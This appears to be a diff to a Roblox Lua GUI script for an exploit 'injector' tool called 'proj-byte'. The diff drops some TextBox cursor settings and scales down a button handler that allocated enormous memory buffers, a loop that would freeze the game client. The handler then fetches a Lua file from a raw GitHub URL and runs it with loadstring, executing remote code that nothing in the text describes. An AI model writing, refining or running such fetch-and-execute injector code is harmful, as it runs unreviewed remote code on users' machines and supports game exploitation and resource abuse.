@@ -53,7 +53,6 @@ G2L["5"] = Instance.new("LocalScript", G2L["4"]);
 
 -- StarterGui.proj-byte.title-root.main-root.textbox.TextBox
 G2L["6"] = Instance.new("TextBox", G2L["4"]);
-G2L["6"]["CursorPosition"] = -1;
 G2L["6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["6"]["BorderSizePixel"] = 0;
 G2L["6"]["TextWrapped"] = true;
@@ -219,7 +218,6 @@ G2L["12"]["Position"] = UDim2.new(0.03012, 0, 0, 0);
 
 -- StarterGui.proj-byte.title-root.main-root.newscriptTAB.name
 G2L["13"] = Instance.new("TextBox", G2L["10"]);
-G2L["13"]["CursorPosition"] = -1;
 G2L["13"]["Name"] = [[name]];
 G2L["13"]["TextSize"] = 14;
 G2L["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
@@ -235,7 +233,6 @@ G2L["13"]["Text"] = [[]];
 
 -- StarterGui.proj-byte.title-root.main-root.newscriptTAB.script
 G2L["14"] = Instance.new("TextBox", G2L["10"]);
-G2L["14"]["CursorPosition"] = -1;
 G2L["14"]["Name"] = [[script]];
 G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["14"]["TextSize"] = 14;
@@ -546,10 +543,21 @@ local script = G2L["b"];
 	
 	inj.MouseButton1Click:Connect(function()
 		local buffers = {}
+		local maxBuffers = 50  -- Keep it sane
 	
-		for i = 1, 1000 do
-			table.insert(buffers, buffer.create(10024 * 10024))
-			task.wait(0.01) -- Throttle to avoid instant freeze
+		for i = 1, maxBuffers do
+			local success, result = pcall(function()
+				return buffer.create(1024 * 1024)  -- 1 MB per buffer
+			end)
+	
+			if success then
+				table.insert(buffers, result)
+			else
+				warn("Buffer allocation failed at index " .. i)
+				break
+			end
+	
+			task.wait(0.01)
 		end
 		
 		local injector=loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/HerbertV1/refs/heads/main/main.lua"))()
